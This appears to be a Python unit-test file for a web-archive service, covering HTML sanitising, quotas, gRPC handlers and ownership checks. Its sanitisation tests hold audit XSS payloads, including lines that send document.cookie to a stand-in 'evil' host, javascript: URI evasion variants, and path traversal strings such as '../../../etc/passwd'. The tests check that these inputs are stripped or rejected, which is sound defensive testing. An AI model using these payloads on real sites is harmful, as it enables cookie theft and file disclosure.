"""Archive service unit tests - page processor, quota, servicer RPCs."""

import os
import sys
import unittest
from datetime import datetime, timedelta, timezone
from unittest.mock import MagicMock, patch

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..", "..", "shared"))
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..", "..", "shared", "proto_generated"))
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

# Stub out boto3/botocore before servicer imports them
sys.modules["boto3"] = MagicMock()
sys.modules["botocore"] = MagicMock()
sys.modules["botocore.config"] = MagicMock()

# ---------------------------------------------------------------------------
# Shared per-service module names: models/servicer/quota/page_processor exist
# in every service. Import this suite's copies ONCE and register them under a
# unique alias; tests/conftest.py re-points the shared sys.modules names per
# test so combined multi-suite pytest runs never use another service's code.
# ---------------------------------------------------------------------------
_PP_ALIAS = "_ppsvc_archive-service_"
if _PP_ALIAS + "models" not in sys.modules:
    for _name in ("models", "servicer", "quota", "page_processor"):
        sys.modules.pop(_name, None)

import archive_pb2
import grpc
import models  # noqa: F401  -- register ORM tables on Base.metadata before create_all
import page_processor  # noqa: F401
import quota as _quota_mod  # noqa: F401  -- alias: local `quota` vars shadow the name
import servicer  # noqa: F401
from db import Base, db_session
from page_processor import sanitise_and_rewrite

for _name in ("models", "page_processor", "quota", "servicer"):
    sys.modules[_PP_ALIAS + _name] = sys.modules[_name]

# ---------------------------------------------------------------------------
# Page processor tests
# ---------------------------------------------------------------------------

class TestPageProcessor(unittest.TestCase):
    def test_rewrite_asset_refs(self):
        html = b'<html><img src="photo.jpg"><link href="style.css"></html>'
        asset_map = {"photo.jpg": "assets/photo.jpg", "style.css": "assets/style.css"}
        rewritten, _preview, _body = sanitise_and_rewrite(html, asset_map)
        self.assertIn(b"assets/photo.jpg", rewritten)
        self.assertIn(b"assets/style.css", rewritten)

    def test_preview_text_extraction(self):
        html = b"<html><body><p>Hello World</p></body></html>"
        _, preview, body = sanitise_and_rewrite(html, {})
        self.assertIn("Hello World", body)
        self.assertTrue(len(preview) <= 500)

    def test_empty_html(self):
        html = b""
        rewritten, _preview, _body = sanitise_and_rewrite(html, {})
        self.assertIsNotNone(rewritten)

    def test_no_matching_assets(self):
        html = b'<html><img src="other.png"></html>'
        asset_map = {"photo.jpg": "assets/photo.jpg"}
        rewritten, _, _ = sanitise_and_rewrite(html, asset_map)
        self.assertIn(b"other.png", rewritten)
        self.assertNotIn(b"assets/photo.jpg", rewritten)

    def test_rewrite_mixed_asset_refs(self):
        """HTML with img, link, source, video, audio referencing assets."""
        html = (
            b'<html><head>'
            b'<link href="styles.css">'
            b'</head><body>'
            b'<img src="photo.jpg">'
            b'<source src="video.mp4">'
            b'<video src="clip.webm"></video>'
            b'<audio src="sound.mp3"></audio>'
            b'<img data-src="lazy.png">'
            b'</body></html>'
        )
        asset_map = {
            "styles.css": "assets/styles.css",
            "photo.jpg": "assets/photo.jpg",
            "video.mp4": "assets/video.mp4",
            "clip.webm": "assets/clip.webm",
            "sound.mp3": "assets/sound.mp3",
            "lazy.png": "assets/lazy.png",
        }
        rewritten, _, _ = sanitise_and_rewrite(html, asset_map)
        for orig, new in asset_map.items():
            self.assertIn(new.encode(), rewritten, f"{orig} should be rewritten to {new}")
        self.assertNotIn(b'src="photo.jpg"', rewritten)
        self.assertNotIn(b'href="styles.css"', rewritten)
        self.assertNotIn(b"<script", rewritten)

    def test_asset_with_query_params(self):
        html = b'<html><img src="photo.jpg?v=1&w=200"></html>'
        asset_map = {"photo.jpg": "assets/photo.jpg"}
        rewritten, _, _ = sanitise_and_rewrite(html, asset_map)
        self.assertIn(b"assets/photo.jpg", rewritten)

    def test_rewrite_nested_asset_paths(self):
        """Full path matching for nested local paths like images/foo.jpg."""
        html = b'<html><img src="./images/photo.jpg"><link href="./styles/main.css"></html>'
        asset_map = {
            "images/photo.jpg": "assets/images/photo.jpg",
            "styles/main.css": "assets/styles/main.css",
        }
        rewritten, _, _ = sanitise_and_rewrite(html, asset_map)
        self.assertIn(b"assets/images/photo.jpg", rewritten)
        self.assertIn(b"assets/styles/main.css", rewritten)
        self.assertNotIn(b"./images/photo.jpg", rewritten)

    def test_rewrite_root_absolute_asset_refs(self):
        """Root-absolute references (e.g. Next.js /_next/...) must be rewritten
        to archive-relative paths so they resolve inside the archive folder
        rather than the host origin (which would 404). Script tags are stripped
        entirely (they can never run in the sandboxed viewer)."""
        html = (
            b'<html><head>'
            b'<script src="/_next/static/chunks/app.js"></script>'
            b'<link href="/_next/static/css/main.css">'
            b'</head><body>'
            b'<img src="/images/photo.jpg">'
            b'</body></html>'
        )
        asset_map = {
            "app.js": "assets/app.js",
            "main.css": "assets/main.css",
            "photo.jpg": "assets/photo.jpg",
        }
        rewritten, _, _ = sanitise_and_rewrite(html, asset_map)
        # Script tags are removed outright.
        self.assertNotIn(b"<script", rewritten)
        self.assertNotIn(b"app.js", rewritten)
        # Mapped assets resolve to the archive-relative path.
        self.assertIn(b"assets/main.css", rewritten)
        self.assertIn(b"assets/photo.jpg", rewritten)
        # No host-root absolute paths remain.
        self.assertNotIn(b'href="/_next', rewritten)
        self.assertNotIn(b'src="/images', rewritten)

    def test_rewrite_unmapped_root_absolute_stays_in_archive(self):
        """An unmapped root-absolute asset is made archive-relative (no leading
        slash) so the request stays within the archive namespace, not the host."""
        html = b'<html><img src="/_next/static/chunks/missing.js"></html>'
        rewritten, _, _ = sanitise_and_rewrite(html, {})
        self.assertIn(b'src="_next/static/chunks/missing.js"', rewritten)
        self.assertNotIn(b'src="/_next', rewritten)

    def test_external_and_anchor_urls_left_untouched(self):
        html = (
            b'<html><img src="https://cdn.example.com/a.png">'
            b'<a href="#section">x</a>'
            b'<img src="//cdn.example.com/b.png">'
            b'</html>'
        )
        rewritten, _, _ = sanitise_and_rewrite(html, {})
        self.assertIn(b"https://cdn.example.com/a.png", rewritten)
        self.assertIn(b'href="#section"', rewritten)
        self.assertIn(b"//cdn.example.com/b.png", rewritten)

    def test_removes_base_tags(self):
        """Base tags must be removed to prevent overriding relative paths."""
        html = b'<html><head><base href="https://example.com/"></head><body><img src="images/photo.jpg"></body></html>'
        asset_map = {"images/photo.jpg": "assets/images/photo.jpg"}
        rewritten, _, _ = sanitise_and_rewrite(html, asset_map)
        self.assertNotIn(b"<base", rewritten)
        self.assertIn(b"assets/images/photo.jpg", rewritten)

    def test_strips_script_tags(self):
        """All <script> tags (inline, external, JSON-LD) must be removed from stored HTML."""
        html = (
            b'<html><head><script src="app.js"></script>'
            b'<script type="application/ld+json">{"a":1}</script></head>'
            b'<body><p>Hi</p><script>alert(1)</script><img src="photo.jpg"></body></html>'
        )
        rewritten, _, body = sanitise_and_rewrite(html, {"photo.jpg": "assets/photo.jpg"})
        self.assertNotIn(b"<script", rewritten)
        self.assertNotIn(b"alert(1)", rewritten)
        self.assertNotIn(b"app.js", rewritten)
        self.assertIn(b"assets/photo.jpg", rewritten)
        self.assertIn("Hi", body)


# ---------------------------------------------------------------------------
# Helpers for quota and servicer tests
# ---------------------------------------------------------------------------

def _make_quota_dict(user_id="u1", pages=0, total_bytes=0, reset_at=None):
    """Return a plain dict-like mock that quota.check_and_reserve can use."""
    q = MagicMock()
    q.user_id = user_id
    q.pages_this_month = pages
    q.total_bytes = total_bytes
    q.quota_reset_at = reset_at or datetime.now(timezone.utc) + timedelta(days=30)
    return q


def _make_page(page_id="p1", user_id="u1", url="https://example.com",
               title="Test", preview_text="preview", r2_key="u1/p1/index.html",
               size_bytes=1000, extension_job_id="job1",
               archived_at=None):
    page = MagicMock()
    page.id = page_id
    page.user_id = user_id
    page.url = url
    page.title = title
    page.preview_text = preview_text
    page.r2_key = r2_key
    page.size_bytes = size_bytes
    page.extension_job_id = extension_job_id
    page.archived_at = archived_at or datetime.now(timezone.utc)
    return page


class _FakeContext:
    def __init__(self):
        self._code = None
        self._details = None

    def set_code(self, code):
        self._code = code

    def set_details(self, details):
        self._details = details


# ---------------------------------------------------------------------------
# Quota tests
# ---------------------------------------------------------------------------

class TestQuota(unittest.TestCase):
    def test_under_quota_returns_none(self):
        from quota import check_and_reserve
        mock_session = MagicMock()
        quota = _make_quota_dict(pages=10, total_bytes=100)
        mock_session.execute.return_value.scalar_one_or_none.return_value = quota
        result = check_and_reserve(mock_session, "u1", "free", 1000)
        self.assertIsNone(result)

    def test_page_limit_exceeded(self):
        from models import PLAN_LIMITS
        from quota import check_and_reserve
        mock_session = MagicMock()
        quota = _make_quota_dict(pages=PLAN_LIMITS["free"]["pages_per_month"])
        mock_session.execute.return_value.scalar_one_or_none.return_value = quota
        result = check_and_reserve(mock_session, "u1", "free", 1000)
        self.assertEqual(result, "Monthly page limit reached")

    def test_byte_limit_exceeded(self):
        from models import PLAN_LIMITS
        from quota import check_and_reserve
        mock_session = MagicMock()
        quota = _make_quota_dict(total_bytes=PLAN_LIMITS["free"]["max_bytes"])
        mock_session.execute.return_value.scalar_one_or_none.return_value = quota
        result = check_and_reserve(mock_session, "u1", "free", 1)
        self.assertEqual(result, "Storage limit reached")

    def test_pro_plan_higher_limits(self):
        from models import PLAN_LIMITS
        from quota import check_and_reserve
        mock_session = MagicMock()
        quota = _make_quota_dict(pages=PLAN_LIMITS["free"]["pages_per_month"])
        mock_session.execute.return_value.scalar_one_or_none.return_value = quota
        result = check_and_reserve(mock_session, "u1", "pro", 1000)
        self.assertIsNone(result)

    def test_monthly_rollover(self):
        from quota import check_and_reserve
        mock_session = MagicMock()
        quota = _make_quota_dict(
            pages=50,
            reset_at=datetime.now(timezone.utc) - timedelta(days=1),
        )
        mock_session.execute.return_value.scalar_one_or_none.return_value = quota
        result = check_and_reserve(mock_session, "u1", "free", 1000)
        self.assertIsNone(result)
        self.assertEqual(quota.pages_this_month, 0)

    def test_new_user_creates_quota(self):
        from quota import check_and_reserve
        mock_session = MagicMock()
        mock_session.execute.return_value.scalar_one_or_none.return_value = None
        result = check_and_reserve(mock_session, "new_user", "free", 1000)
        self.assertIsNone(result)
        mock_session.add.assert_called_once()


# ---------------------------------------------------------------------------
# Servicer tests
# ---------------------------------------------------------------------------

def _build_ingest_request(**overrides):
    defaults = {
        "user_id": "u1", "url": "https://example.com", "title": "Test",
        "html_content": b"<html><body>Hello</body></html>",
        "assets": [], "extension_job_id": "job1", "plan": "free",
    }
    defaults.update(overrides)
    return archive_pb2.IngestPageRequest(**defaults)


class TestIngestPage(unittest.TestCase):
    @patch("servicer._get_search_stub", return_value=None)
    @patch("servicer.R2Client")
    @patch("servicer.check_and_reserve", return_value=None)
    @patch("servicer.db_session")
    @patch("servicer.get_engine", return_value=MagicMock())
    def test_ingest_success(self, mock_engine, mock_db_session, mock_quota,
                            mock_r2, mock_search):
        from servicer import ArchiveServicer
        mock_session = MagicMock()
        # First execute: idempotency check -> None (new page)
        # Second execute: quota increment -> quota_row
        quota_row = _make_quota_dict()
        call_count = [0]
        def fake_execute(stmt):
            call_count[0] += 1
            result = MagicMock()
            result.scalar_one_or_none.return_value = None if call_count[0] == 1 else quota_row
            return result
        mock_session.execute = fake_execute
        mock_db_session.return_value.__enter__ = lambda s: mock_session
        mock_db_session.return_value.__exit__ = lambda s, *a: None
        mock_r2.return_value.upload = MagicMock()

        svc = ArchiveServicer()
        ctx = _FakeContext()
        req = _build_ingest_request(assets=[
            archive_pb2.Asset(filename="photo.jpg", content_type="image/jpeg", data=b"\xff\xd8\xff"),
        ])
        resp = svc.IngestPage(req, ctx)

        self.assertTrue(resp.success)
        self.assertTrue(resp.page_id)
        # 1 asset + index.html + meta.json = 3 uploads
        self.assertEqual(mock_r2.return_value.upload.call_count, 3)

    @patch("servicer._get_search_stub", return_value=None)
    @patch("servicer.R2Client")
    @patch("servicer.check_and_reserve", return_value=None)
    @patch("servicer.db_session")
    @patch("servicer.get_engine", return_value=MagicMock())
    def test_idempotent_replay(self, mock_engine, mock_db_session, mock_quota,
                               mock_r2, mock_search):
        """Second IngestPage with same extension_job_id returns existing page_id."""
        from servicer import ArchiveServicer
        existing_page = _make_page(page_id="existing-id")

        mock_session = MagicMock()
        mock_session.execute.return_value.scalar_one_or_none.return_value = existing_page
        mock_db_session.return_value.__enter__ = lambda s: mock_session
        mock_db_session.return_value.__exit__ = lambda s, *a: None

        svc = ArchiveServicer()
        ctx = _FakeContext()
        resp = svc.IngestPage(_build_ingest_request(extension_job_id="job1"), ctx)

        self.assertTrue(resp.success)
        self.assertEqual(resp.page_id, "existing-id")
        mock_r2.return_value.upload.assert_not_called()

    @patch("servicer._get_search_stub", return_value=None)
    @patch("servicer.R2Client")
    @patch("servicer.check_and_reserve", return_value="Monthly page limit reached")
    @patch("servicer.db_session")
    @patch("servicer.get_engine", return_value=MagicMock())
    def test_quota_exceeded_no_r2_write(self, mock_engine, mock_db_session,
                                         mock_quota, mock_r2, mock_search):
        """When quota is exceeded, no R2 upload happens."""
        import grpc
        from servicer import ArchiveServicer

        mock_session = MagicMock()
        mock_session.execute.return_value.scalar_one_or_none.return_value = None
        mock_db_session.return_value.__enter__ = lambda s: mock_session
        mock_db_session.return_value.__exit__ = lambda s, *a: None

        svc = ArchiveServicer()
        ctx = _FakeContext()
        resp = svc.IngestPage(_build_ingest_request(), ctx)

        self.assertFalse(resp.success)
        self.assertEqual(ctx._code, grpc.StatusCode.RESOURCE_EXHAUSTED)
        mock_r2.return_value.upload.assert_not_called()


class TestCrossUserIsolation(unittest.TestCase):
    @patch("servicer.R2Client")
    @patch("servicer.db_session")
    @patch("servicer.get_engine", return_value=MagicMock())
    def test_get_page_wrong_user(self, mock_engine, mock_db_session, mock_r2):
        import grpc
        from servicer import ArchiveServicer

        page = _make_page(page_id="p1", user_id="owner-u1")
        mock_session = MagicMock()
        mock_session.execute.return_value.scalar_one_or_none.return_value = page
        mock_db_session.return_value.__enter__ = lambda s: mock_session
        mock_db_session.return_value.__exit__ = lambda s, *a: None

        svc = ArchiveServicer()
        ctx = _FakeContext()
        req = archive_pb2.GetPageRequest(page_id="p1", user_id="attacker-u2")
        svc.GetPage(req, ctx)

        self.assertEqual(ctx._code, grpc.StatusCode.NOT_FOUND)

    @patch("servicer.R2Client")
    @patch("servicer.db_session")
    @patch("servicer.get_engine", return_value=MagicMock())
    def test_get_page_content_wrong_user(self, mock_engine, mock_db_session, mock_r2):
        import grpc
        from servicer import ArchiveServicer

        page = _make_page(page_id="p1", user_id="owner-u1")
        mock_session = MagicMock()
        mock_session.execute.return_value.scalar_one_or_none.return_value = page
        mock_db_session.return_value.__enter__ = lambda s: mock_session
        mock_db_session.return_value.__exit__ = lambda s, *a: None

        svc = ArchiveServicer()
        ctx = _FakeContext()
        req = archive_pb2.GetPageContentRequest(page_id="p1", user_id="attacker-u2")
        svc.GetPageContent(req, ctx)

        self.assertEqual(ctx._code, grpc.StatusCode.NOT_FOUND)
        mock_r2.return_value.presign.assert_not_called()

    @patch("servicer._get_search_stub", return_value=None)
    @patch("servicer.R2Client")
    @patch("servicer.db_session")
    @patch("servicer.get_engine", return_value=MagicMock())
    def test_delete_page_wrong_user(self, mock_engine, mock_db_session, mock_r2, mock_search):
        from servicer import ArchiveServicer

        page = _make_page(page_id="p1", user_id="owner-u1")
        mock_session = MagicMock()
        mock_session.execute.return_value.scalar_one_or_none.return_value = page
        mock_db_session.return_value.__enter__ = lambda s: mock_session
        mock_db_session.return_value.__exit__ = lambda s, *a: None

        svc = ArchiveServicer()
        ctx = _FakeContext()
        req = archive_pb2.DeletePageRequest(page_id="p1", user_id="attacker-u2")
        resp = svc.DeletePage(req, ctx)

        self.assertFalse(resp.success)
        self.assertEqual(resp.message, "not found")
        mock_r2.return_value.delete_prefix.assert_not_called()


class TestDeletePage(unittest.TestCase):
    @patch("servicer._get_search_stub")
    @patch("servicer.R2Client")
    @patch("servicer.db_session")
    @patch("servicer.get_engine", return_value=MagicMock())
    def test_delete_cleans_r2_and_quota(self, mock_engine, mock_db_session,
                                         mock_r2, mock_search):
        from servicer import ArchiveServicer

        page = _make_page(page_id="p1", user_id="u1", size_bytes=5000)
        quota_row = _make_quota_dict(user_id="u1", total_bytes=10000)

        mock_session = MagicMock()
        call_count = [0]

        def fake_execute(stmt):
            call_count[0] += 1
            result = MagicMock()
            if call_count[0] == 1:
                result.scalar_one_or_none.return_value = page
            else:
                result.scalar_one_or_none.return_value = quota_row
            return result

        mock_session.execute = fake_execute
        mock_session.delete = MagicMock()
        mock_db_session.return_value.__enter__ = lambda s: mock_session
        mock_db_session.return_value.__exit__ = lambda s, *a: None

        mock_search_stub = MagicMock()
        mock_search.return_value = mock_search_stub

        svc = ArchiveServicer()
        ctx = _FakeContext()
        req = archive_pb2.DeletePageRequest(page_id="p1", user_id="u1")
        resp = svc.DeletePage(req, ctx)

        self.assertTrue(resp.success)

        # R2 prefix deleted
        mock_r2.return_value.delete_prefix.assert_called_once_with("u1/p1")

        # Thumbnail deleted
        mock_r2.return_value.delete.assert_called_once_with("u1/p1.webp")

        # Page row deleted
        mock_session.delete.assert_called_once_with(page)

        # Quota decremented
        self.assertEqual(quota_row.total_bytes, 5000)

        # Search removal called
        mock_search_stub.RemovePage.assert_called_once()


class TestGetArchiveFile(unittest.TestCase):
    @patch("servicer.R2Client")
    @patch("servicer.db_session")
    @patch("servicer.get_engine", return_value=MagicMock())
    def test_fetch_file_success(self, mock_engine, mock_db_session, mock_r2_cls):
        from servicer import ArchiveServicer

        page = _make_page(page_id="p1", user_id="u1")
        mock_session = MagicMock()
        mock_session.execute.return_value.scalar_one_or_none.return_value = page
        mock_db_session.return_value.__enter__ = lambda s: mock_session
        mock_db_session.return_value.__exit__ = lambda s, *a: None

        mock_r2 = MagicMock()
        mock_r2.bucket = "test-bucket"
        body = MagicMock()
        body.read.return_value = b"<html>data</html>"
        mock_r2.client.get_object.return_value = {
            "Body": body,
            "ContentType": "text/html; charset=utf-8",
        }
        mock_r2_cls.return_value = mock_r2

        svc = ArchiveServicer()
        ctx = _FakeContext()
        req = archive_pb2.GetArchiveFileRequest(
            page_id="p1", user_id="u1", file_path="index.html",
        )
        resp = svc.GetArchiveFile(req, ctx)

        self.assertEqual(resp.data, b"<html>data</html>")
        self.assertEqual(resp.content_type, "text/html; charset=utf-8")
        mock_r2.client.get_object.assert_called_once_with(
            Bucket="test-bucket", Key="u1/p1/index.html",
        )

    @patch("servicer.R2Client")
    @patch("servicer.db_session")
    @patch("servicer.get_engine", return_value=MagicMock())
    def test_path_traversal_rejected(self, mock_engine, mock_db_session, mock_r2_cls):
        import grpc
        from servicer import ArchiveServicer

        mock_r2_cls.return_value = MagicMock()
        svc = ArchiveServicer()

        mock_session = MagicMock()
        mock_session.execute.return_value.scalar_one_or_none.return_value = None
        mock_db_session.return_value.__enter__ = lambda s: mock_session
        mock_db_session.return_value.__exit__ = lambda s, *a: None

        # Reject paths with /.. traversal
        ctx = _FakeContext()
        req = archive_pb2.GetArchiveFileRequest(
            page_id="p1", user_id="u1", file_path="foo/../../../etc/passwd",
        )
        svc.GetArchiveFile(req, ctx)
        self.assertEqual(ctx._code, grpc.StatusCode.INVALID_ARGUMENT)

        # Reject absolute paths
        ctx2 = _FakeContext()
        req2 = archive_pb2.GetArchiveFileRequest(
            page_id="p1", user_id="u1", file_path="/etc/passwd",
        )
        svc.GetArchiveFile(req2, ctx2)
        self.assertEqual(ctx2._code, grpc.StatusCode.INVALID_ARGUMENT)

        # Allow filenames containing ".." without a slash (edge case)
        ctx3 = _FakeContext()
        req3 = archive_pb2.GetArchiveFileRequest(
            page_id="p1", user_id="u1", file_path="assets/image..thumb.jpg",
        )
        page = _make_page(page_id="p1", user_id="u1")
        mock_session.execute.return_value.scalar_one_or_none.return_value = page
        mock_r2 = MagicMock()
        mock_r2.bucket = "test-bucket"
        body = MagicMock()
        body.read.return_value = b"\xff\xd8\xff"
        mock_r2.client.get_object.return_value = {"Body": body, "ContentType": "image/jpeg"}
        svc.r2 = mock_r2

        svc.GetArchiveFile(req3, ctx3)
        self.assertIsNone(ctx3._code)  # No error set

    @patch("servicer.R2Client")
    @patch("servicer.db_session")
    @patch("servicer.get_engine", return_value=MagicMock())
    def test_file_not_found_in_r2(self, mock_engine, mock_db_session, mock_r2_cls):
        import grpc
        from servicer import ArchiveServicer

        page = _make_page(page_id="p1", user_id="u1")
        mock_session = MagicMock()
        mock_session.execute.return_value.scalar_one_or_none.return_value = page
        mock_db_session.return_value.__enter__ = lambda s: mock_session
        mock_db_session.return_value.__exit__ = lambda s, *a: None

        mock_r2 = MagicMock()
        mock_r2.bucket = "test-bucket"
        mock_r2.client.get_object.side_effect = Exception("NoSuchKey")
        mock_r2_cls.return_value = mock_r2

        svc = ArchiveServicer()
        ctx = _FakeContext()
        req = archive_pb2.GetArchiveFileRequest(
            page_id="p1", user_id="u1", file_path="assets/missing.jpg",
        )
        resp = svc.GetArchiveFile(req, ctx)

        self.assertEqual(ctx._code, grpc.StatusCode.NOT_FOUND)
        self.assertEqual(resp.data, b"")


# ---------------------------------------------------------------------------
# Sanitisation tests (2.7) — XSS payloads from the audit
# ---------------------------------------------------------------------------

class TestSanitisation(unittest.TestCase):
    def _sanitize(self, html: bytes, asset_map=None):
        return sanitise_and_rewrite(html, asset_map or {})[0]

    def test_inline_event_handler_removed(self):
        """Audit payload: onerror must be stripped, src preserved."""
        html = b'<html><img src="a.png" onerror="fetch(\'//evil?t=\'+document.cookie)"></html>'
        rewritten = self._sanitize(html)
        self.assertNotIn(b"onerror", rewritten)
        self.assertIn(b'src="a.png"', rewritten)

    def test_onclick_and_mixed_case_handlers_removed(self):
        html = b'<html><body><div onclick="evil()" ONMOUSEOVER="evil()">x</div></body></html>'
        rewritten = self._sanitize(html)
        self.assertNotIn(b"onclick", rewritten)
        self.assertNotIn(b"ONMOUSEOVER", rewritten)
        self.assertNotIn(b"evil()", rewritten)

    def test_javascript_uri_neutralized_anchor_text_kept(self):
        """Audit payload: javascript: href neutralized, anchor text preserved."""
        html = (
            b"<html><a href=\"javascript:document.location='//evil/'+document.cookie\">x</a></html>"
        )
        rewritten = self._sanitize(html)
        self.assertNotIn(b"javascript:", rewritten)
        self.assertNotIn(b"//evil/", rewritten)
        self.assertIn(b">x</a>", rewritten)

    def test_javascript_uri_evasions_caught(self):
        for payload in (
            b'JaVaScRiPt:alert(1)',
            b'java\tscript:alert(1)',
            b'java\nscript:alert(1)',
            b'  javascript:alert(1)',
            b'jav\x01ascript:alert(1)',
        ):
            html = b'<html><a href="' + payload + b'">x</a></html>'
            rewritten = self._sanitize(html)
            self.assertNotIn(b"alert(1)", rewritten, payload)

    def test_data_text_html_blocked(self):
        html = (
            b'<html><iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>'
            b'<a href="data:text/html,<script>alert(1)</script>">y</a></html>'
        )
        rewritten = self._sanitize(html)
        self.assertNotIn(b"data:text/html", rewritten)
        self.assertNotIn(b"PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg", rewritten)

    def test_data_image_uris_allowed(self):
        """Archived pages legitimately use inline data: images — preserved."""
        uri = b"data:image/png;base64,iVBORw0KGgo="
        html = b'<html><img src="' + uri + b'"></html>'
        rewritten = self._sanitize(html)
        self.assertIn(uri, rewritten)

    def test_svg_onload_removed(self):
        html = b'<html><svg onload="alert(1)"><circle r="1"/></svg></html>'
        rewritten = self._sanitize(html)
        self.assertNotIn(b"onload", rewritten)
        self.assertNotIn(b"alert(1)", rewritten)
        self.assertIn(b"<svg", rewritten)  # element itself survives

    def test_srcdoc_embed_removed(self):
        html = (
            b'<html><iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe></html>'
        )
        rewritten = self._sanitize(html)
        self.assertNotIn(b"srcdoc", rewritten)
        self.assertNotIn(b"alert(1)", rewritten)

    def test_form_action_neutralized(self):
        html = b'<html><form action="javascript:fetch(\'//evil\')"><input type="submit"></form></html>'
        rewritten = self._sanitize(html)
        self.assertNotIn(b"javascript:", rewritten)
        self.assertIn(b"<form", rewritten)

    def test_xlink_href_neutralized(self):
        html = b'<html><svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg></html>'
        rewritten = self._sanitize(html)
        self.assertNotIn(b"javascript:", rewritten)

    def test_legitimate_content_survives(self):
        """Spec: nothing removed except scripts, handlers, dangerous URIs."""
        html = (
            b'<html><head><style>body{color:red}</style></head><body>'
            b'<p class="x">Hello</p><img src="photo.jpg" alt="pic">'
            b'<a href="https://example.com">link</a><form action="/go"></form>'
            b"</body></html>"
        )
        rewritten, _preview, body = sanitise_and_rewrite(
            html, {"photo.jpg": "assets/photo.jpg"}
        )
        self.assertIn(b"Hello", rewritten)
        self.assertIn(b'alt="pic"', rewritten)
        self.assertIn(b"https://example.com", rewritten)
        self.assertIn(b'action="/go"', rewritten)
        self.assertIn(b"assets/photo.jpg", rewritten)
        self.assertIn(b"Hello", body.encode() if isinstance(body, str) else body)


# ---------------------------------------------------------------------------
# Mandatory ownership (2.3): empty user_id is never a wildcard
# ---------------------------------------------------------------------------

class TestEmptyUserIdRejected(unittest.TestCase):
    @patch("servicer.R2Client")
    @patch("servicer.db_session")
    @patch("servicer.get_engine", return_value=MagicMock())
    def test_get_page_content_empty_user_id_invalid(self, mock_engine, mock_db_session, mock_r2):
        import grpc
        from servicer import ArchiveServicer

        page = _make_page(page_id="p1", user_id="owner-u1")
        mock_session = MagicMock()
        mock_session.execute.return_value.scalar_one_or_none.return_value = page
        mock_db_session.return_value.__enter__ = lambda s: mock_session
        mock_db_session.return_value.__exit__ = lambda s, *a: None

        svc = ArchiveServicer()
        ctx = _FakeContext()
        svc.GetPageContent(
            archive_pb2.GetPageContentRequest(page_id="p1", user_id=""), ctx
        )
        self.assertEqual(ctx._code, grpc.StatusCode.INVALID_ARGUMENT)
        mock_r2.return_value.presign.assert_not_called()

    @patch("servicer.R2Client")
    @patch("servicer.db_session")
    @patch("servicer.get_engine", return_value=MagicMock())
    def test_get_archive_file_empty_user_id_invalid(self, mock_engine, mock_db_session, mock_r2_cls):
        import grpc
        from servicer import ArchiveServicer

        mock_r2_cls.return_value = MagicMock()
        svc = ArchiveServicer()
        ctx = _FakeContext()
        svc.GetArchiveFile(
            archive_pb2.GetArchiveFileRequest(
                page_id="p1", user_id="", file_path="index.html",
            ),
            ctx,
        )
        self.assertEqual(ctx._code, grpc.StatusCode.INVALID_ARGUMENT)
        mock_r2_cls.return_value.client.get_object.assert_not_called()


# ---------------------------------------------------------------------------
# Path traversal hardening (2.8)
# ---------------------------------------------------------------------------

class TestPathTraversalHardening(unittest.TestCase):
    def _svc_with_owner_page(self, mock_db_session):
        page = _make_page(page_id="p1", user_id="u1")
        mock_session = MagicMock()
        mock_session.execute.return_value.scalar_one_or_none.return_value = page
        mock_db_session.return_value.__enter__ = lambda s: mock_session
        mock_db_session.return_value.__exit__ = lambda s, *a: None
        return page

    @patch("servicer.R2Client")
    @patch("servicer.db_session")
    @patch("servicer.get_engine", return_value=MagicMock())
    def test_leading_traversal_rejected(self, mock_engine, mock_db_session, mock_r2_cls):
        import grpc
        from servicer import ArchiveServicer

        self._svc_with_owner_page(mock_db_session)
        mock_r2_cls.return_value = MagicMock()
        svc = ArchiveServicer()
        ctx = _FakeContext()
        svc.GetArchiveFile(
            archive_pb2.GetArchiveFileRequest(
                page_id="p1", user_id="u1", file_path="../other-page/index.html",
            ),
            ctx,
        )
        self.assertEqual(ctx._code, grpc.StatusCode.INVALID_ARGUMENT)
        mock_r2_cls.return_value.client.get_object.assert_not_called()

    @patch("servicer.R2Client")
    @patch("servicer.db_session")
    @patch("servicer.get_engine", return_value=MagicMock())
    def test_embedded_traversal_normalizing_to_dotdot_rejected(
        self, mock_engine, mock_db_session, mock_r2_cls
    ):
        import grpc
        from servicer import ArchiveServicer

        self._svc_with_owner_page(mock_db_session)
        mock_r2_cls.return_value = MagicMock()
        svc = ArchiveServicer()

        for path in ("a/../../x", "assets/../../secret", "..", "a/../.."):
            ctx = _FakeContext()
            svc.GetArchiveFile(
                archive_pb2.GetArchiveFileRequest(
                    page_id="p1", user_id="u1", file_path=path,
                ),
                ctx,
            )
            self.assertEqual(ctx._code, grpc.StatusCode.INVALID_ARGUMENT, path)
            mock_r2_cls.return_value.client.get_object.assert_not_called()

    @patch("servicer.R2Client")
    @patch("servicer.db_session")
    @patch("servicer.get_engine", return_value=MagicMock())
    def test_absolute_path_rejected(self, mock_engine, mock_db_session, mock_r2_cls):
        import grpc
        from servicer import ArchiveServicer

        self._svc_with_owner_page(mock_db_session)
        mock_r2_cls.return_value = MagicMock()
        svc = ArchiveServicer()
        ctx = _FakeContext()
        svc.GetArchiveFile(
            archive_pb2.GetArchiveFileRequest(
                page_id="p1", user_id="u1", file_path="/abs",
            ),
            ctx,
        )
        self.assertEqual(ctx._code, grpc.StatusCode.INVALID_ARGUMENT)
        mock_r2_cls.return_value.client.get_object.assert_not_called()

    @patch("servicer.R2Client")
    @patch("servicer.db_session")
    @patch("servicer.get_engine", return_value=MagicMock())
    def test_benign_inner_dotdot_path_resolves_within_root(
        self, mock_engine, mock_db_session, mock_r2_cls
    ):
        """a/../b normalizes to b — inside the root, so allowed."""
        from servicer import ArchiveServicer

        self._svc_with_owner_page(mock_db_session)
        mock_r2 = MagicMock()
        mock_r2.bucket = "b"
        mock_r2.client.get_object.return_value = {
            "Body": MagicMock(**{"read.return_value": b"x"}),
            "ContentType": "text/plain",
        }
        mock_r2_cls.return_value = mock_r2
        svc = ArchiveServicer()
        ctx = _FakeContext()
        svc.GetArchiveFile(
            archive_pb2.GetArchiveFileRequest(
                page_id="p1", user_id="u1", file_path="assets/../index.html",
            ),
            ctx,
        )
        self.assertIsNone(ctx._code)
        mock_r2.client.get_object.assert_called_once_with(
